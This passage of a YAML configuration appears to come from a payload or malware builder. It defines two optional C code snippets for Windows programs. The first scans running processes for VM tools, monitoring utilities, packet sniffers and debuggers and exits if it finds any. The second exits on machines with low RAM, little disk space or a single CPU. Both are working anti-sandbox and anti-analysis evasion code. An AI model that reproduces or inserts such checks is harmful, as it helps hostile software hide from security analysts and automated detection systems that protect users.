      }
  - id: ProcessListCheck
    display: Sandbox Process Detection
    default: false
    snippet: "// Anti-sandbox: Check for sandbox/analysis processes\n{\n    const wchar_t* sandboxProcs[] = {\n        L\"vmtoolsd.exe\", L\"vmwaretray.exe\", L\"vmwareuser.exe\",\n        L\"vboxservice.exe\", L\"vboxtray.exe\",\n        L\"sandboxiedcomlaunch.exe\", L\"sandboxierpcss.exe\",\n        L\"procmon.exe\", L\"procmon64.exe\", L\"procexp.exe\", L\"procexp64.exe\",\n        L\"wireshark.exe\", L\"fiddler.exe\", L\"tcpview.exe\",\n        L\"autoruns.exe\", L\"filemon.exe\", L\"regmon.exe\",\n        L\"idaq.exe\", L\"idaq64.exe\", L\"x64dbg.exe\", L\"x32dbg.exe\"\n    };\n    \n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hSnap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe32 = {sizeof(pe32)};\n        if (Process32FirstW(hSnap, &pe32)) {\n            do {\n                for (int i = 0; i < 19; i++) {\n                    if (_wcsicmp(pe32.szExeFile, sandboxProcs[i]) == 0) {\n                        CloseHandle(hSnap);\n                        return 0;\n                    }\n                }\n            } while (Process32NextW(hSnap, &pe32));\n        }\n        CloseHandle(hSnap);\n    }\n}\n"
  - id: LowResourceCheck
    display: Low Resource Detection
    default: false
    snippet: "// Anti-sandbox: Check for unrealistically low system resources\n{\n    // Check RAM (sandboxes often have <2GB)\n    MEMORYSTATUSEX memStatus = {sizeof(memStatus)};\n    if (GlobalMemoryStatusEx(&memStatus)) {\n        if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { // < 2GB\n            return 0;\n        }\n    }\n    \n    // Check disk size (sandboxes often have <60GB)\n    ULARGE_INTEGER totalBytes;\n    if (GetDiskFreeSpaceExW(L\"C:\\\\\", NULL, &totalBytes, NULL)) {\n        if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) { // < 60GB\n            return 0;\n        }\n    }\n    \n    // Check number of processors\n    SYSTEM_INFO sysInfo;\n    GetSystemInfo(&sysInfo);\n    if (sysInfo.dwNumberOfProcessors < 2) {\n        return 0;\n    }\n}\n"
